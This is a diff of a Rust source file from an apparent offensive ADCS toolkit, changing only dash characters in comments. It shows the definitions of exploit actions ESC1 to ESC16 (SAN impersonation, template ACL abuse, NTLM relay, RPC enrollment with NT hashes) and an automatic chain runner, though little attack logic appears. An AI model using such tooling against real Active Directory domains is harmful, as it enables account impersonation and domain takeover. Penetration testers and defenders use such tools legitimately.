@@ -1,4 +1,4 @@
-//! Top-level ADCS dispatcher — orchestrates ESC1-16 exploit chains.
+//! Top-level ADCS dispatcher -- orchestrates ESC1-16 exploit chains.
 //!
 //! Takes a CA URL + template + credentials and walks the entire ESC chain end-to-end,
 //! automatically assessing vulnerabilities and selecting the appropriate exploit path.
@@ -26,56 +26,56 @@ pub enum AdcsAction {
         /// Target UPN to impersonate (for SAN-based attacks)
         target_upn: Option<String>,
     },
-    /// ESC1 — SAN (Subject Alternative Name) Abuse
+    /// ESC1 -- SAN (Subject Alternative Name) Abuse
     Esc1 {
         /// Vulnerable template name
         template: String,
         /// Target UPN to impersonate
         target_upn: String,
     },
-    /// ESC2 — Any Purpose EKU Abuse
+    /// ESC2 -- Any Purpose EKU Abuse
     Esc2 {
         /// Template with Any Purpose EKU
         template: String,
         /// Target UPN to impersonate
         target_upn: String,
     },
-    /// ESC3 — Enrollment Agent EKU Abuse
+    /// ESC3 -- Enrollment Agent EKU Abuse
     Esc3 {
         /// Enrollment Agent template
         template: String,
         /// Target UPN to impersonate via agent
         target_upn: String,
     },
-    /// ESC4 — Vulnerable Certificate Template ACL
+    /// ESC4 -- Vulnerable Certificate Template ACL
     Esc4 {
         /// Template to modify
         template: String,
         /// Action: "exploit" or "restore"
         action: String,
     },
-    /// ESC5 — Vulnerable PKI Object ACL
+    /// ESC5 -- Vulnerable PKI Object ACL
     Esc5 {
         /// PKI object DN to target
         object_dn: String,
         /// Action to perform
         action: String,
     },
-    /// ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
+    /// ESC6 -- EDITF_ATTRIBUTESUBJECTALTNAME2
     Esc6 {
         /// Template to exploit
         template: String,
         /// Target UPN to impersonate
         target_upn: String,
     },
-    /// ESC7 — Vulnerable Certificate Authority ACL
+    /// ESC7 -- Vulnerable Certificate Authority ACL
     Esc7 {
         /// CA name
         ca_name: String,
         /// Action: "manageca", "managecerts", or "issue"
         action: String,
     },
-    /// ESC8 — NTLM Relay to ADCS Web Enrollment
+    /// ESC8 -- NTLM Relay to ADCS Web Enrollment
     Esc8 {
         /// CA server hostname
         ca_server: String,
@@ -84,8 +84,8 @@ pub enum AdcsAction {
         /// Target UPN (if SAN supported)
         target_upn: Option<String>,
     },
-    /// ESC8 via raw TCP RPC — certificate enrollment over ICertRequestD DCOM/RPC.
-    /// No HTTP, no SMB — uses the native AD CS enrollment protocol directly.
+    /// ESC8 via raw TCP RPC -- certificate enrollment over ICertRequestD DCOM/RPC.
+    /// No HTTP, no SMB -- uses the native AD CS enrollment protocol directly.
     Esc8Rpc {
         /// CA server hostname or IP
         ca_server: String,
@@ -109,7 +109,7 @@ pub enum AdcsAction {
         /// Target UPN to embed in CSR subject (optional)
         target_upn: Option<String>,
     },
-    /// ESC9 — Weak Certificate Mappings
+    /// ESC9 -- Weak Certificate Mappings
     Esc9 {
         /// Template to exploit
         template: String,
@@ -154,7 +154,7 @@ pub struct AdcsConfig {
     pub action: AdcsAction,
     /// Output path for certificate (PFX/DER)
     pub output_path: Option<String>,
-    /// Dry run — validate config without executing
+    /// Dry run -- validate config without executing
     pub dry_run: bool,
     /// Use HTTPS (true) or HTTP (false) for web enrollment
     pub use_ssl: bool,
@@ -289,7 +289,7 @@ pub async fn run_adcs(config: &AdcsConfig) -> Result<AdcsResult> {
     }
 }
 
-/// Execute Auto mode — try ESC1, ESC6, ESC9 in order (SAN-based attacks)
+/// Execute Auto mode -- try ESC1, ESC6, ESC9 in order (SAN-based attacks)
 async fn execute_auto(
     config: &AdcsConfig,
     template: &str,
@@ -778,7 +778,7 @@ async fn execute_esc8(
 /// Execute ESC8 via raw TCP RPC (ICertRequestD over DCE/RPC).
 ///
 /// Directly requests a certificate from the CA using the native AD CS
-/// enrollment protocol over TCP RPC — no HTTP or SMB required.
+/// enrollment protocol over TCP RPC -- no HTTP or SMB required.
 async fn execute_esc8_rpc(
     ca_server: &str,
     template: &str,
@@ -843,7 +843,7 @@ async fn execute_esc8_rpc_dcom(
         ca_server, template, target_upn
     );
 
-    // Determine auth credentials — require password or NT hash
+    // Determine auth credentials -- require password or NT hash
     let password = config.password.as_deref();
     let nt_hash = config.nt_hash.as_deref();
 
